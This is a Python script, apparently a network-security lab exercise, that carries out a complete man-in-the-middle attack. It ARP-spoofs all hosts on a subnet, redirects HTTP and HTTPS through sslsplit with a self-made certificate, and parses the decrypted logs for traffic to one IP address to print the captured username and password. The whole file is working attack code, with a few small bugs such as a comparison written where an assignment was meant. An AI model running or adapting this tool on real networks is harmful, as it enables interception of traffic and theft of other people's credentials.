#!/usr/bin/env python3
from tabnanny import verbose
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import os
from time import sleep
import netifaces
import threading

def enable_ipv4_forwarding():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ipv4_forwarding():
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def get_gateway_ip():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]

def scanner():
    target_ip = "192.168.218.1/24"
    gateway_ip = get_gateway_ip()
    arp = scapy.ARP(pdst=target_ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = scapy.srp(packet, timeout=3, verbose=0)[0]
    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices:")
    print("-------------------------------------")
    print("IP" + " "*18+"MAC")
    print("-------------------------------------")
    gateway_mac = None
    gateway_index = 0
    for i in range(len(clients)):
        if clients[i]['ip'] == gateway_ip:
            gateway_mac == clients[i]['mac']
            gateway_index = i
        else:
            print("{:16}    {}".format(clients[i]['ip'], clients[i]['mac']))
    del clients[gateway_index]
    return gateway_ip, gateway_mac, clients

def spoofed_send(source_ip, dst_ip):
    packet = scapy.ARP(op=2, pdst=dst_ip, psrc=source_ip, hwdst=scapy.Ether().src)
    scapy.send(packet, verbose=False)

def restore(source_ip, dst_ip, source_mac, dst_mac):
    packet = scapy.ARP(op=2, pdst=dst_ip, psrc=source_ip, hwdst=dst_mac, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def arp_spoofer(gateway_ip, gateway_mac, targets):
    try:
        while True:
            for target in targets:
                spoofed_send(target['ip'], gateway_ip)
                spoofed_send(gateway_ip, target['ip'])  
                # print('Spoofed packets sent.')  
            sleep(0.1)
    except KeyboardInterrupt:
        print('Keyboard interruptted')
        for target in targets:
            restore(target['ip'], gateway_ip, target['mac'], gateway_mac)
            restore(gateway_ip, target['ip'], target['mac'], gateway_mac)  

def redirect_ports():
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')

def sslsplit():
    global lock
    os.system('sudo rm -rf sslsplit')
    os.system('mkdir -p sslsplit/logdir')
    lock.release()
    os.system('sudo sslsplit -l connections.log -j sslsplit/ -S sslsplit/logdir/ -k myCA.key -c myCA.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 > /dev/null')

def get_content():
    username = None
    password = None
    while True:
        for file_name in os.listdir('sslsplit/logdir/'):
            if '140.113.41.24' in file_name:
                f = open('sslsplit/logdir/'+file_name, 'r', errors='ignore')
                lines = f.readlines()
                f.close()
                for line in lines:
                    if 'username' in line:
                        temp1 = line.split('username=')
                        temp2 = temp1[1].split('&password=')
                        username = temp2[0]
                        temp3 = temp2[1].split('&token=')
                        password = temp3[0]
                        return username, password
                

enable_ipv4_forwarding()
gateway_ip, gateway_mac, targets = scanner()
thread1 = threading.Thread(target = arp_spoofer, args = (gateway_ip, gateway_mac, targets, ), daemon = True)
thread1.start()
redirect_ports()
lock = threading.Lock()
lock.acquire()
thread2 = threading.Thread(target = sslsplit, args = (), daemon=True)
thread2.start()
lock.acquire()
username, password = get_content()
print('Username: %s'%(username))
print('Passwaord: %s'%(password))
disable_ipv4_forwarding()